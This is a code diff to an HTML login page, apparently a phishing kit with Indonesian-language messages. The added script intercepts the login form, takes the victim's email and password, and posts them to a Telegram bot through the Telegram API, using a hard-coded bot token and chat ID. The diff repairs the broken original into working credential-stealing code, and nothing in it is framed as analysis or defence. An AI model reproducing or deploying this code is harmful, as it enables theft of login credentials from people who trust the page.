@@ -20,20 +20,40 @@
   </div>
 
   <script>
-    document.getElementById("loginForm").addEventListener("submit", function(event) {
+    document.getElementById("loginForm").addEventListener("submit", async function(event) {
       event.preventDefault();
-      var email = document.getElementById("email").value;
-      var password = document.getElementById("password").value;
 
-const botToken = "7906274301:AAFMIgRpysWIpa9bIrREjZu9LJE7KGXabGs"; // Ganti dengan token bot lo
-                const chatId = "8092060437"; // Ganti dengan ID chat lo
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+      const pesan = `Email: ${email}\nPassword: ${password}`;
 
-                const telegramApi = https://api.telegram.org/bot${botToken}/sendMessage;
-                const telegramResponse = await fetch(telegramApi, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: chatId, text: pesan, parse_mode: "Markdown" })
-                });
+      const botToken = "7906274301:AAFMIgRpysWIpa9bIrREjZu9LJE7KGXabGs";
+      const chatId = "8092060437";
+      const telegramApi = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-                if (telegramResponse.ok) {
-                    document.body.innerHTML = "<h2>Pesan berhasil dikirim ke Telegram!</h2>";
+      try {
+        const telegramResponse = await fetch(telegramApi, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: pesan,
+            parse_mode: "Markdown"
+          })
+        });
+
+        if (telegramResponse.ok) {
+          document.body.innerHTML = "<h2>Pesan berhasil dikirim ke Telegram!</h2>";
+        } else {
+          alert("Gagal mengirim pesan ke Telegram.");
+        }
+      } catch (error) {
+        console.error("Terjadi kesalahan:", error);
+        alert("Terjadi kesalahan saat mengirim pesan.");
+      }
+    });
+  </script>
+</body>
+</html>
